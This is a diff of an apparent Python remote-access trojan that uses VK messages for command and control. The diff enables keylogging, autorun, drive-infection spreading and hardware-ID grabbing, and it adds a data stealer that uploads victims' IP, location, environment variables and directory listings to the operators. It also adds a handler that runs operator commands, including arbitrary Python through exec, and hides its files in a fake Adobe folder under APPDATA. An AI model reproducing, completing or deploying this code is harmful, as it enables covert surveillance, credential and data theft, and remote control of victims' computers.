@@ -5,9 +5,9 @@ DEBUG = True
 
 try:
     # Other modules (Not is preinstalled).
+    # TODO: Move at server setup (but for now there is no NON-VK server types.)
     import vk_api
     import vk_api.utils
-    import vk_api.bot_longpoll
     import vk_api.upload
 
     # Default modules (Preinstalled).
@@ -23,14 +23,14 @@ try:
     import threading
     import datetime
     import re
-except ImportError as _exception:
+except ImportError as exception:
     # If there is import error.
 
     if DEBUG:
         # If debug is enabled.
 
         # Printing message.
-        print(f"Cannot import {_exception}!")
+        print(f"Cannot import {exception}!")
 
     # Exiting.
     raise SystemExit
@@ -44,8 +44,8 @@ config = {}
 # Server API.
 __SERVER_API = None
 
-# Server bot.
-__SERVER_BOT = None
+# Server longpoll.
+__SERVER_LONGPOLL = None
 
 # Tags of the client (Set in load_tags).
 __TAGS = []
@@ -74,116 +74,29 @@ __COMMANDS_HELP = None
 # System OK code.
 __SYSTEM_OK = 0
 
-# Is HWID grabbing is disabled or not (Slow working at the start).
-DISABLE_HWID = True
-
-# Dont add to autorun?
-DISABLED_AUTORUN = True
-
 # Message for when not is admin.
 MESSAGE_NOT_ADMIN = "Sorry, but you don't have required permissions to make this command!"
 
-# Is spreading disabled or not.
-SPREADING_INFECTION_DISABLED = True
+# Is HWID grabbing is disabled or not (Slow working at the start).
+DISABLE_HWID = False
+
+# Dont add to autorun?
+DISABLED_AUTORUN = False
 
 # Is spreading disabled or not.
-SPREADING_DISABLED = True
+SPREADING_INFECTION_DISABLED = False
+
+# Is spreading disabled or not.
+SPREADING_DISABLED = False
 
 # Is keylogger disabled or not.
-KEYLOGGER_DISABLED = True
+KEYLOGGER_DISABLED = False
 
 # Drives that we will skip when infecting drives.
 SPREADING_SKIPPED_DRIVES = ("C", "D")
 
 # Version of the app.
 VERSION = "[Pre-release] 0.5.0"
-
-
-# Refactor later... >>>
-
-def filesystem_try_delete(_path):
-    # Tries to delete.
-    try:
-        return os.remove(_path)
-    except Exception:
-        return None
-
-
-def filesystem_try_listdir(_path):
-    # Tries to listdir.
-    try:
-        return os.listdir(_path)
-    except Exception:
-        return []
-
-
-# Refactor later... <<<
-
-def filesystem_get_size(_path: str) -> int:
-    # @function filesystem_get_size()
-    # @returns float
-    # @description Function that returns size of the item in megabytes.
-
-    if os.path.exists(_path):
-        # If path exists.
-        if os.path.isfile(_path):
-            # If this is file.
-
-            # Getting size of the file.
-            return int(os.path.getsize(_path) / 1024 / 1024)
-        elif os.path.isdir(_path):
-            # If this is directory.
-
-            # Getting size of the directory.
-            _directory_size = int(os.path.getsize(_path) / 1024 / 1024)
-
-            for _directory_file in filesystem_try_listdir(_path):
-                # For all items in the directory.
-
-                # Getting file path.
-                _directory_file_path = os.path.join(_path, _directory_file)
-
-                # Adding size.
-                _directory_size += filesystem_get_size(_directory_file_path)
-
-            # Returning size.
-            return int(_directory_size)
-    else:
-        # If path not exists.
-
-        # Error.
-        return 0
-
-
-def filesystem_get_type(_path: str) -> str:
-    # @function filesystem_get_type()
-    # @returns str
-    # @description Function that returns type of the file as the string.
-
-    if os.path.isdir(_path):
-        # If this is directory.
-
-        # Returning directory.
-        return "Directory"
-    elif os.path.isfile(_path):
-        # If this is file.
-
-        # Returning file.
-        return "File"
-    elif os.path.islink(_path):
-        # If this is link.
-
-        # Returning link.
-        return "Link"
-    elif os.path.ismount(_path):
-        # If this is mount.
-
-        # Returning mount.
-        return "Mount"
-
-    # Returning unknown type if not returned any above.
-    return "Unknown"
-
 
 def command_taskkill(_arguments, _event) -> str:
     # @function command_taskkill()
@@ -901,44 +814,6 @@ def command_discord_profile(_arguments: str, _event) -> str:
     return f"[ID{_profile['id']}]\n[{_profile['email']}]\n[{_profile['phone']}]\n{_profile['username']}\n\n{_avatar}"
 
 
-def executable_get_extension() -> str:
-    # @function executable_get_extension()
-    # @returns str
-    # @description Function that return extension of the current executable file.
-
-    return sys.argv[0].split('.')[-1]
-
-
-def filesystem_build_path(_path: str) -> None:
-    # @function filesystem_build_path()
-    # @returns None
-    # @description Function that builds path to the file.
-
-    try:
-        # Trying to build path.
-
-        # Getting path elements (split by \\)
-        _path = _path.split("\\")
-
-        # Removing last element (filename)
-        _path.pop()
-
-        # Converting back to the string
-        _path = "\\".join(_path)
-
-        if not os.path.exists(_path):
-            # If path not exists.
-
-            # Making directories.
-            os.makedirs(_path)
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function filesystem_build_path()! "
-                      f"Full exception information - {_exception}")
-
-
 def spreading_infect_drive(_drive: str) -> None:
     # @function spreading_infect_drive()
     # @returns list
@@ -987,35 +862,6 @@ def spreading_infect_drive(_drive: str) -> None:
 
         # Showing debug message to the developer.
         debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
-                      f"Full exception information - {_exception}")
-
-
-def list_difference(_list_one, _list_two) -> list:
-    # @function list_difference()
-    # @returns list
-    # @description Function that returns list with difference between two given lists.
-
-    # Returning.
-    return [i for i in _list_one if i not in _list_two]
-
-
-def filesystem_get_drives_list() -> list:
-    # @function filesystem_get_drives_list()
-    # @returns list
-    # @description Function that returns list of the all drives in the system.
-
-    try:
-        # Getting drive letters.
-        _drives_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-
-        # Returning list.
-        return ["%s:\\\\" % _drive_letter for _drive_letter in _drives_letters
-                if os.path.exists('%s:\\\\' % _drive_letter)]
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function filesystem_get_drives_list()! "
                       f"Full exception information - {_exception}")
 
 
@@ -1090,30 +936,6 @@ def spreading_start() -> None:
     threading.Thread(target=spreading_thread).start()
 
 
-def set_folder_path() -> None:
-    # @function set_folder_path()
-    # @returns None
-    # @description Function that set folder path for the app.
-
-    # Globalize folder variable.
-    global __FOLDER
-
-    # Setting folder.
-    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\PMT\\Storage\\"
-
-
-def get_folder_path() -> str:
-    # @function get_folder_path()
-    # @returns str
-    # @description Function that returns folder path for the app.
-
-    # Globalize folder variable.
-    global __FOLDER
-
-    # Returning folder.
-    return __FOLDER
-
-
 def assert_operating_system() -> None:
     # @function assert_operating_system()
     # @returns None
@@ -1153,15 +975,517 @@ def assert_operating_system() -> None:
     raise SystemExit
 
 
-def keylogger_start() -> None:
-    # @function keylogger_start()
+def save_name() -> None:
+    # @function save_name()
     # @returns None
-    # @description Function that starts keylogger (Setting callback for on release keyboard function).
+    # @description Function that saves name to the file.
+
+    try:
+        # Trying to save name.
+
+        # Getting path.
+        _path = __FOLDER + "name.dat"
+
+        # Building path.
+        filesystem_build_path(_path)
+
+        with open(_path, "w", encoding="UTF-8") as _tf:
+            # With opened file.
+
+            # Writing name.
+            _tf.write(str(__NAME))
+    except Exception as _exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"Oops... Exception occurred in function save_name()! "
+                      f"Full exception information - {_exception}")
+
+
+def load_name() -> None:
+    # @function load_name()
+    # @returns None
+    # @description Function that loads all name data.
+
+    # Globalising name.
+    global __NAME
+
+    try:
+        # Trying to load name.
+
+        # Getting path.
+        _path = __FOLDER + "name.dat"
+
+        # Building path.
+        filesystem_build_path(_path)
+
+        if os.path.exists(_path):
+            # If we have name file.
+
+            try:
+                # Trying to read name.
+
+                # Clearing name.
+                __NAME = ""
+
+                with open(_path, "r", encoding="UTF-8") as _nf:
+                    # With opened file.
+
+                    # Reading name.
+                    __NAME = str(_nf.read())
+            except Exception as _exception:  # noqa
+                # If there is exception occurred.
+
+                # Debug message.
+                debug_message(f"Can`t load name file! Exception: {_exception}")
+
+                # Name.
+                __NAME = get_ip()["ip"]  # noqa
+
+                # Saving name.
+                save_name()
+        else:
+            # If we don't have name file.
+
+            # Name.
+            __NAME = get_ip()["ip"]  # noqa
+
+            # Saving name.
+            save_name()
+    except Exception as _exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"Oops... Exception occurred in function load_name()! "
+                      f"Full exception information - {_exception}")
+
+        # Name.
+        __NAME = get_ip()["ip"]  # noqa
+
+
+def stealer_steal_data(_force: bool = False):
+    # @function stealer_steal_data()
+    # @returns None
+    # @description Function that steals all the data from the client.
+
+    # Globalising values.
+    global __VALUES
+
+    try:
+        # Trying to steal.
+
+        if not stealer_is_already_worked() or _force:
+            # If we not already stolen data or forcing.
+
+            # Getting file name.
+            _path = __FOLDER + "log.json"
+
+            # Getting ip data.
+            _ip = get_ip()
+
+            # Getting path data.
+            _userprofile = os.getenv("userprofile")
+            _drive = os.getcwd().split("\\")[0]
+
+            # Writing values.
+            __VALUES["internet_ipaddress"] = _ip["ip"]  # noqa
+            __VALUES["internet_city"] = _ip["city"]  # noqa
+            __VALUES["internet_country"] = _ip["country"]  # noqa
+            __VALUES["internet_region"] = _ip["region"]  # noqa
+            __VALUES["internet_provider"] = _ip["org"]  # noqa
+
+            if not DISABLE_HWID:
+                # If HWID is not disabled.
+
+                # Writing HWID.
+                __VALUES["computer_hardware_index"] = get_hwid()
+
+            if not sys.platform.startswith('linux'):
+                # If not linux.
+
+                # Windows values.
+                __VALUES["computer_username"] = os.getenv("UserName")
+                __VALUES["computer_name"] = os.getenv("COMPUTERNAME")
+                __VALUES["computer_operating_system"] = os.getenv("OS")
+                __VALUES["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
+                __VALUES["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
+                __VALUES["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
+                __VALUES["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
+                __VALUES["computer_processor"] += os.getenv("PROCESSOR_REVISION")
+                __VALUES["computer_environment_variables"] = get_environment_variables()
+                __VALUES["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
+                __VALUES["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
+                __VALUES["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
+                __VALUES["directory_root"] = filesystem_try_listdir(_drive + "\\")
+                __VALUES["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
+                __VALUES["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
+                # Disable as may take too long time to execute?
+                # __VALUES["discord_tokens"] = stealer_steal_discord_tokens()
+                # __VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
+
+            # Building path.
+            filesystem_build_path(_path)
+
+            with open(_path, "w") as _file:
+                # With opened file.
+
+                # Dumping.
+                json.dump(__VALUES, _file, indent=4)
+
+            for _peer in config["server"]["vk"]["users"]:
+                # For every peer in admins.
+
+                # Uploading document.
+                _uploading_result = server_upload_document(_path, "Log File", _peer, "doc")
+
+                # Message.
+                if type(_uploading_result) == str:
+                    # If all is ok.
+
+                    # Message.
+                    server_message(f"[Stealer] Stolen data:", _uploading_result, _peer)
+                else:
+                    # If there is error.
+
+                    # Message.
+                    server_message(f"[Stealer] Error when uploading stolen data: {_uploading_result}", None, _peer)
+
+            # Returning value.
+            return __VALUES
+    except Exception as _exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"Oops... Exception occurred in function steal_data()! "
+                      f"Full exception information - {_exception}")
+
+        # Returning value.
+        return {_exception}
+
+
+def user_is_admin(_peer: str) -> bool:
+    # @function user_is_admin()
+    # @returns None
+    # @description Function that returns is given user is admin or not.
+
+    # Read admins.
+    admins = config["server"]["vk"]["users"]
+
+    if admins is None or len(admins) == 0:
+        # If there is no admins in the list
+
+        # Returning true as there is no admins.
+        return True
+
+    # Returning.
+    return _peer in admins
+
+
+def client_answer_server(_event) -> None:
+    # @function client_answer_server()
+    # @returns None
+    # @description Function that process message from the remote access (server).
+
+    # Getting text from the event.
+    _text = _event.text
+
+    # Getting peer from the event.
+    _peer = _event.peer_id
+
+    # Text of the response.
+    _response_text = None
+
+    # Attachment of the response.
+    _response_attachment = None
+
+    try:
+        # Trying to answer.
+
+        # Getting arguments from the message (Message split by space).
+        _message_arguments = _text.split(";")
+
+        if len(_message_arguments) == 0:
+            # If empty.
+
+            # Returning.
+            return
+
+            # Getting tags.
+        _message_tags = _message_arguments[0]
+        _message_arguments.pop(0)
+
+        if _message_tags == "alive":
+            # If this is network command (That is work without tags and for all).
+
+            if user_is_admin(_peer):
+                # If user is admin and allowed to make commands.
+
+                # Getting current time.
+                _current_time = datetime.datetime.now().strftime("%H:%M:%S")
+
+                # Answering that we in network.
+                _response_text = f"Alive! Time: {_current_time}"
+            else:
+                # If not is admin.
+
+                # Answering with an error.
+                _response_text = MESSAGE_NOT_ADMIN
+        else:
+            # If this is not alive command.
+
+            if list_intersects(parse_tags(_message_tags), __TAGS):
+                # If we have one or more tag from our tags.
+
+                if user_is_admin(_peer):
+                    # If user is admin.
+
+                    if len(_message_arguments) == 0:
+                        # If there is no tags + command.
+
+                        # Responding with error.
+                        _response_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
+                    else:
+                        # If there is no error.
+
+                        # Getting command itself.
+                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
+                        _message_arguments.pop(0)
+
+                        # Getting arguments (Joining all left list indices together).
+                        _command_arguments = ";".join(_message_arguments)
+
+                        # Executing command.
+                        _execution_response = client_execute_command(_message_command, _command_arguments, _event)
+
+                        if type(_execution_response) == list:
+                            # If response is list.
+
+                            # Uploading attachment to the message.
+
+                            if len(_execution_response) < 3:
+                                # If invalid length.
+
+                                # Getting error response.
+                                _response_text = "Invalid attachment response from the executing of command!"
+                            else:
+                                # If all correct.
+
+                                # Uploading.
+
+                                # Getting values.
+                                _uploading_path = _execution_response[0]
+                                _uploading_title = _execution_response[1]
+                                _uploading_type = _execution_response[2]
+
+                                if _uploading_type == "photo":
+                                    # If this is just photo.
+
+                                    # Uploading photo on the server.
+                                    _uploading_result = server_upload_photo(_uploading_path)
+
+                                    # Moving result to attachment.
+                                    _response_text = _uploading_title
+                                    _response_attachment = _uploading_result
+                                elif _uploading_type in ("doc", "audio_message"):
+                                    # If this is document or audio message.
+
+                                    # Uploading file on the server.
+                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
+                                                                               _peer, _uploading_type)
+
+                                    if type(_uploading_result) == str:
+                                        # If uploading file result is string then all OK.
+
+                                        # Setting response.
+                                        _response_text = _uploading_title
+                                        _response_attachment = _uploading_result
+                                    else:
+                                        # If there is an error.
+
+                                        # Setting response.
+                                        _response_text = f"Error when uploading document: {_uploading_result}"
+
+                                    # Trying to delete.
+                                    filesystem_try_delete(_uploading_path)
+                        else:
+                            # If default string response.
+                            # Getting text.
+                            _response_text = _execution_response
+                else:
+                    # If not is admin.
+
+                    # Answering with an error.
+                    _response_text = MESSAGE_NOT_ADMIN
+            else:
+                # If lists of tags not intersects.
+
+                # Returning.
+                return
+    except Exception as _exception:  # noqa
+        # If there an exception.
+
+        # Getting exception answer.
+        _response_text = f"Oops... There is exception while client try to answer message. " \
+                         f"Exception information: {_exception}"
+
+    # Answering server.
+    if _response_text is not None:
+        # If response was not void from execution function.
+
+        # Answering.
+        server_message(f"{_response_text}", _response_attachment, _peer)
+    else:
+        # None answer.
+        server_message(f"Void... (No response)", _response_attachment, _peer)
+
+
+def server_upload_photo(_path: str) -> str:
+    # @function server_upload_photo()
+    # @returns str
+    # @description Function that  uploads photo on the server.
+
+    # Getting uploader.
+    _uploader = vk_api.upload.VkUpload(__SERVER_API)
+
+    # Uploading photo.
+    _photo = _uploader.photo_messages(_path)
+    _photo = _photo[0]
+
+    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
+        # If photo have all those fields.
+
+        # Getting photo fields.
+        _owner_id = _photo['owner_id']
+        _photo_id = _photo['id']
+        _access_key = _photo['access_key']
+
+        # Returning photo URN.
+        return f'photo{_owner_id}_{_photo_id}_{_access_key}'
+
+    # Returning blank.
+    return ""
+
+
+def execute_python(_code: str, _globals: dict, _locals: dict) -> any:
+    # @function server_upload_photo()
+    # @returns any
+    # @description Function that executes python code and returns it out in variable out.
+
+    # Getting global out.
+    global out
+
+    # Getting clean code.
+    _clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')
+
+    try:
+        # Trying to execute.
+
+        # Executing replaced code.
+        exec(_clean_code, _globals, _locals)
+    except Exception as _exception:  # noqa
+        # If there is an error.
+
+        # Returning.
+        return f"Python code exception: {_exception}"
+
+    try:
+        # Trying to return out.
+
+        # Returning out.
+        return out
+    except NameError:
+        # If there is an name error.
+
+        # Returning.
+        return f"Python code does not return output! Write in out"
+
+
+def client_execute_command(_command_name: str, _arguments: str, _event) -> str:
+    # @function client_execute_command()
+    # @returns str
+    # @description Function that executes python code and returns it out in variable out.
+
+    for _command in __COMMANDS_FUNCTION:  # noqa
+        # For all commands names in commands dict.
+
+        if _command_name == _command:
+            # If it is this commands.
+
+            # Executing command and returning result.
+            return __COMMANDS_FUNCTION[_command](_arguments, _event)  # noqa
+
+    # Default answer.
+    return f"Invalid command {_command_name}! Write help command and get all commands!"
+
+
+def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
+    # @function server_upload_document()
+    # @returns str or list
+    # @description Function that uploads document on the server and returns it.
+
+    try:
+        # Trying to upload document.
+
+        # Getting api for the uploader.
+        _server_api = __SERVER_API.get_api()  # noqa
+
+        # Getting upload server.
+        _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']
+
+        # Posting file on the server.
+        _request = json.loads(requests.post(_upload_server, files={'file': open(_path, 'rb')}).text)
+
+        if "file" in _request:
+            # If there is all fields in response.
+
+            # Saving file to the docs.
+            _request = _server_api.docs.save(file=_request['file'], title=_title, tags=[])
+
+            # Returning document.
+            return f"doc{_request[_type]['owner_id']}_{_request[_type]['id']}"
+        else:
+            # If there is not all fields.
+
+            # Debug message.
+            debug_message(f"Error when uploading document (Request)!")
+
+            # Returning request as error.
+            return [_request]  # noqa
+    except Exception as _exception:  # noqa
+        # If there is error.
+
+        # Debug message.
+        debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
+
+        # Returning exception.
+        return [_exception]  # noqa
+
+
+# Debug.
+
+def debug_message(message: str) -> None:
+    """ Show debug message if debug mode."""
+
+    if not DEBUG:
+        # If debug is not enabled.
+
+        # Returning.
+        return
+
+    # Printing message.
+    print(message)
+
+
+# Keylogger.
+
+def keylogger_start() -> None:
+    """ Starts keylogger (Add keyboard callback). """
 
     if KEYLOGGER_DISABLED:
         # If keylogger is disabled.
 
         # Returning.
+        debug_message("[Keylogger] Not starting, as disabled...")
         return
 
     try:
@@ -1173,51 +1497,50 @@ def keylogger_start() -> None:
         # If there is ImportError occurred.
 
         # Debug message.
-        debug_message("Oops... Not started keylogger as there is no module with name \"keyboard\"!")
+        debug_message("[Keylogger] Can`t start as there is no required module with name \"keyboard\"!")
 
         # Returning and not starting keylogger.
         return
 
     # Setting keyboard on release trigger to our callback event function.
     keyboard.on_release(callback=keylogger_callback_event)
+    debug_message("[Keylogger] Registered callback event...")
 
     # Debug message.
-    debug_message("[Keylogger] Started! ")
+    debug_message("[Keylogger] Started!")
 
 
-def keylogger_callback_event(_keyboard_event):
-    # @function keylogger_callback_event()
-    # @returns None
-    # @description Function that process keylogger callback event for key released.
+def keylogger_callback_event(keyboard_event):
+    """ Process keyboard callback event for keylloger. """
 
     try:
         # Getting keyboard key from the keyboard event.
-        _keyboard_key = str(_keyboard_event.name)
+        keyboard_key = str(keyboard_event.name)
 
         # Globalising keylog string.
         global __KEYLOG
 
-        if type(_keyboard_key) == str:
+        if type(keyboard_key) == str:
             # If this is string.
-            if len(_keyboard_key) > 1:
+            if len(keyboard_key) > 1:
                 # If this is not the only 1 char.
 
-                if _keyboard_key == "space":
+                if keyboard_key == "space":
                     # If this is space key.
 
                     # Adding space.
                     __KEYLOG = " "
-                elif _keyboard_key == "enter":
+                elif keyboard_key == "enter":
                     # If this enter key.
 
                     # Adding newline.
                     __KEYLOG = "\n"
-                elif _keyboard_key == "decimal":
+                elif keyboard_key == "decimal":
                     # If this is decimal key.
 
                     # Adding dot.
                     __KEYLOG = "."
-                elif _keyboard_key == "backspace":
+                elif keyboard_key == "backspace":
                     # If this is backspace key.
 
                     # Deleting from the keylog.
@@ -1226,28 +1549,661 @@ def keylogger_callback_event(_keyboard_event):
                     # If this is some other key.
 
                     # Formatting key.
-                    _keyboard_key = _keyboard_key.replace(" ", "_").upper()
+                    keyboard_key = keyboard_key.replace(" ", "_").upper()
 
                     # Adding it to the keylog.
-                    __KEYLOG = f"[{_keyboard_key}]"
+                    __KEYLOG = f"[{keyboard_key}]"
             else:
                 # If this is only 1 char.
 
                 # Adding key (char) to the keylogger string.
-                __KEYLOG += _keyboard_key
-    except Exception as _exception:  # noqa
+                __KEYLOG += keyboard_key
+    except Exception as exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function keylogger_callback_event()! "
-                      f"Full exception information - {_exception}")
+        debug_message("[Keylogger] Failed to process keyboard event! Exception - {exception}")
 
+
+# Server.
+
+def server_connect() -> None:
+    """ Connects to the server. """
+
+    # Globalising variables.
+    global __SERVER_API
+    global __SERVER_LONGPOLL
+
+    # Debug message.
+    debug_message(f"[Server] Connecting to the server...")
+
+    try:
+        # Trying to connect to server.
+
+        if "server" not in config or "type" not in config["server"]:
+            # If not config server type key.
+
+            # Error.
+            debug_message(f"[Server] Failed to get configuration server->type value key! Please check configuration file!")
+            exit(1)
+
+        # Reading server type.
+        server_type = config["server"]["type"]
+        
+        if server_type in ("VK_USER", "VK_GROUP"):
+            # If one of the VK server type.
+
+            # Debug message.
+            debug_message(f"[Server] Selected VK \"{server_type}\" server type ...")
+
+            # Get config server access token.
+            access_token = config["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]
+
+            # Importing longpoll.
+            if server_type == "VK_GROUP":
+                import vk_api.bot_longpoll
+            else:
+                import vk_api.longpoll
+
+            # Connect to the VK API.
+            __SERVER_API = vk_api.VkApi(token=access_token)
+
+            # Connecting to the longpoll.
+            if server_type == "VK_GROUP":
+
+                # Get VK group index.
+                group_index = config["server"]["vk"]["group"]["index"]
+
+                # Connect group longpoll.
+                __SERVER_LONGPOLL = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, group_index)
+            else:
+                # Connect user longpoll.
+                __SERVER_LONGPOLL = vk_api.longpoll.VkLongPoll(__SERVER_API)
+        else:
+            # If invalid config server type.
+
+            # Error.
+            debug_message(f"[Server] Failed to connect with current server type, as it may be not implemented / exists. Server type - {server_type}")
+            exit(1)
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Error.
+        debug_message(f"[Server] Failed to connect with server! Exception - {exception}")
+        exit(1)
+
+    # Debug message.
+    debug_message(f"[Server] Connected to the server with type - {server_type}")
+
+
+def server_listen() -> None:
+    """ Listen server for new messages. """
+
+    if __SERVER_LONGPOLL is None:
+        # If server longpoll is not connected.
+
+        # Error.
+        debug_message(f"[Server] Failed to start server listening as server longpoll is not connected!")
+        exit(1)
+
+    if "server" not in config or "type" not in config["server"]:
+        # If not config server type key.
+
+        # Error.
+        debug_message(f"[Server] Faild to get configuration server->type value key! Please check configuration file!")
+        exit(1)
+
+    # Reading server type.
+    server_type = config["server"]["type"]
+    
+    # Message.
+    debug_message("[Server] Starting listening...")
+
+    if server_type in ("VK_USER", "VK_GROUP"):
+        # If one of the VK server type.
+
+        while True:
+            # Infinity loop.
+
+            try:
+                # Trying to listen.
+
+                # Get required message event.
+                message_event =  vk_api.longpoll.VkEventType.MESSAGE_NEW if server_type == "VK_USER" else vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW
+
+                for event in __SERVER_LONGPOLL.listen():  # noqa
+                    # For every message event in the server longpoll listening.
+
+                    if event.type == message_event:
+                        # If this is message event.
+
+                        # Processing client-server answer.
+                        client_answer_server(event)
+                    
+            except Exception as exception:  # noqa
+                # If there is exception occurred.
+
+                # Error.
+                debug_message(f"[Server] Failed to listen server. Exception - {exception}")
+    else:
+        # If invalid config server type.
+
+        # Error.
+        debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. Server type - {server_type}")
+        exit(1)
+
+
+def server_method(method: str, parameters: dict, is_retry=False) -> any:
+    """ Calls server method. """
+
+    if __SERVER_API is None:
+        # If no server API.
+
+        # Just return.
+        return
+
+    try:
+        # Trying to call method.
+
+        if "random_id" not in parameters:
+            # If there is no random id.
+
+            # Adding random id.
+            parameters["random_id"] = vk_api.utils.get_random_id()
+
+        # Executing method.
+        return __SERVER_API.method(method, parameters)  # noqa
+    except Exception as Error:
+        # Error.
+
+        # Message.
+        debug_message(f"[Server] Error when trying to call server method (API)! Error: {Error}")
+
+        # Rading config.
+        retry_on_fail = config["server"]["vk"]["retry_method_on_fail"]
+
+        if is_retry or not retry_on_fail:
+            # If this is already retry.
+
+            # Returning.
+            return
+        else:
+            # If this is not retry.
+
+            # Retrying.
+            return server_method(method, parameters, True)
+
+
+def server_message(text: str, attachmment: str = None, peer: int = None) -> None:
+    """ Sends mesage to the server. """
+
+    # Globalising name.
+    global __NAME
+
+    if peer is None:
+        # If peer index is not specified.
+
+        for config_peer in config["server"]["vk"]["peers"]:
+            # For every peer index in config peer indices.
+
+            # Sending messages to they.
+            server_message(text, attachmment, config_peer)
+
+        # Returning.
+        return
+
+    # Adding name to the text.
+    _text = f"<{__NAME}>\n{text}"
+
+    # Debug message.
+    debug_message("[Server] Sent new message!")
+
+    # Calling method.
+    server_method("messages.send", {
+        "message": _text,
+        "attachment": attachmment,
+        "peer_id": peer
+    })
+
+
+# File System.
+
+def filesystem_try_delete(path) -> bool:
+    """ Tries to delete given file"""
+
+    try:
+        # Deleting.
+        os.remove(path)
+
+        # All OK.
+        return True
+    except Exception:
+        # Error.
+        return False
+
+
+def filesystem_try_listdir(path) -> list:
+    """ Tries to list directory. """
+
+    try:
+        # Listing.
+        return os.listdir(path)
+    except Exception:
+        # Error.
+        return []
+
+
+def filesystem_get_size(path: str) -> int:
+    # @function filesystem_get_size()
+    # @returns float
+    # @description Function that returns size of the item in megabytes.
+
+    # Kilobyte, megabyte size.
+    KB_SIZE = 1024
+    MB_SIZE = KB_SIZE * 1024
+
+    if os.path.exists(path):
+        # If path exists.
+        if os.path.isfile(path):
+            # If this is file.
+
+            # Getting size of the file.
+            return int(os.path.getsize(path) / MB_SIZE)
+        elif os.path.isdir(path):
+            # If this is directory.
+
+            # Returning size of self and childrens.
+            return os.path.getsize(path) / MB_SIZE + sum([filesystem_get_size(os.path.join(path, directory)) for directory in filesystem_try_listdir(path)])
+    else:
+        # If path not exists.
+
+        # Error.
+        return 0
+
+
+def filesystem_get_type(path: str) -> str:
+    """ Returns type of the path. """
+    if os.path.isdir(path):
+        # If this is directory.
+
+        # Returning directory.
+        return "Directory"
+    elif os.path.isfile(path):
+        # If this is file.
+
+        # Returning file.
+        return "File"
+    elif os.path.islink(path):
+        # If this is link.
+
+        # Returning link.
+        return "Link"
+    elif os.path.ismount(path):
+        # If this is mount.
+
+        # Returning mount.
+        return "Mount"
+
+    # Returning unknown type if not returned any above.
+    return "Unknown"
+
+
+def filesystem_build_path(path: str) -> None:
+    """ Builds path. """
+
+    try:
+        # Trying to build path.
+
+        # Getting path elements (split by \\)
+        path = path.split("\\")
+
+        # Removing last element (filename)
+        path.pop()
+
+        # Converting back to the string
+        path = "\\".join(path)
+
+        if not os.path.exists(path):
+            # If path not exists.
+
+            # Making directories.
+            os.makedirs(path)
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"[File System] Failed to build path! Path - {path}. Exception - {exception}")
+
+
+def filesystem_get_drives_list() -> list:
+    """ Returns list of all drives in the system. """
+
+    try:
+        # Getting drive letters.
+        drives_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+        # Returning list.
+        return ["%s:\\\\" % drive_letter for drive_letter in drives_letters
+                if os.path.exists('%s:\\\\' % drive_letter)]
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Error.
+        debug_message(f"[File System] Failed to get drives list! Exception - {exception}")
+
+
+# Tags.
+
+def get_default_tags() -> list:
+    """ Returns default tags. """
+
+    # Return.
+    tags = [get_ip()["ip"], get_operating_system(), "PC"]
+
+    if not DISABLE_HWID:
+        # If we don't disable HWID.
+
+        # Adding HWID.
+        tags.append(get_hwid())
+
+    # Returning tags.
+    return tags
+
+
+def get_error_tags() -> list:
+    """ Returns tags list for error."""
+
+    # Tags.
+    return ["PC", "TAGS_LOADING_ERROR"]
+
+
+def reset_tags() -> None:
+    """ Resets tags. """
+
+    # Globalising tags.
+    global __TAGS
+
+    # Tags list.
+    __TAGS = get_default_tags()
+
+    # Saving tags.
+    save_tags()
+
+
+def load_tags() -> None:
+    """ Loads all tags data. """
+
+    # Globalising tags.
+    global __TAGS
+
+    try:
+        # Trying to load tags.
+
+        # Getting path.
+        path = __FOLDER + config["paths"]["tags"]
+
+        # Building path.
+        filesystem_build_path(path)
+
+        if os.path.exists(path):
+            # If we have tags file.
+
+            try:
+                # Trying to read tags.
+
+                with open(path, "r", encoding="UTF-8") as tags_file:
+                    # With opened file.
+
+                    # Reading tags.
+                    __TAGS = eval(tags_file.read())
+            except Exception as exception:  # noqa
+                # If there is exception occurred.
+
+                # Debug message.
+                debug_message(f"[Tags] Failed to load tags file, resetting tags! Exception: {exception}")
+
+                # Reset tags.
+                reset_tags()
+        else:
+            # If no file.
+
+            # Message.
